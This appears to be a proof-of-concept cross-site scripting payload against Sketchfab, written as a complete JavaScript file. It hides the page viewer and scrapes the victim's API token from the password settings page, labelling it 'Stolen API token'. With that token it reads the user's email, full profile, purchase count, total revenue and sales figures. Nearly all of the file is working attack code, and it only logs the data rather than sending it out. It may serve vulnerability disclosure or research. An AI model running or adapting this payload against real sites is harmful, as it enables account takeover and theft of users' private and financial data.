console.log('loaded');

function append_data(data) {
    console.log(data);
}
try {
document.getElementsByClassName("viewer")[0].remove();
} catch {}

/* token general */

var token_endpoint = "https://sketchfab.com/settings/password";
var token;

var token_request = new XMLHttpRequest();
token_request.open('GET', token_endpoint, false);
token_request.withCredentials = true;
token_request.onload = function() {
    if (token_request.status != 200) {
            console.log(token_request.statusText);
        } else {
            var re = /id=\"api-token\".* value=\"(.+?)\"/;
            token = token_request.response.match(re)[1];
            append_data(`Stolen API token: ${token}`);
        };
};
token_request.send();

/* // token general */

/* purchases */

var endpoint = "https://api.sketchfab.com/v3/me/models/purchases";

var req = new XMLHttpRequest();
req.open('GET', endpoint, false);
req.withCredentials = true;
req.setRequestHeader("authorization", `Token ${token}`)
req.onreadystatechange = function() {
    if(req.readyState === XMLHttpRequest.DONE && req.status === 200) {
        var response = JSON.parse(req.responseText);
        append_data(`Purchases count: ${response.count}`);
    } else { console.log("err"); }
}
req.send();

/* // purchases */


/* userinfo */

var endpoint = "https://api.sketchfab.com/v3/me";
var username;

var req = new XMLHttpRequest();
req.open('GET', endpoint, false);
req.withCredentials = true;
req.setRequestHeader("authorization", `Token ${token}`)
req.onreadystatechange = function() {
    if(req.readyState === XMLHttpRequest.DONE && req.status === 200) {
        var response = JSON.parse(req.responseText);
        username = response.username;
        append_data(`User email: ${response.email}`);
        append_data(`User profile: ${JSON.stringify(response)}`);
    } else { console.log("err"); }
}
req.send();

/* // userinfo */



/* sales */

var endpoint = `https://sketchfab.com/${username}/sales`;
var elements;

var req = new XMLHttpRequest();
req.open('GET', endpoint, false);
req.withCredentials = true;
req.onreadystatechange = function() {
    if(req.readyState === XMLHttpRequest.DONE && req.status === 200) {
        elements = new DOMParser().parseFromString(req.responseText, "text/html").getElementsByClassName("profile-sales__aside-stat");
        append_data(`Total revenue: ${elements[0].textContent}`);
        append_data(`Total sales: ${elements[1].textContent}`);

    } else { console.log("err"); }
}
req.send();
/* // sales */
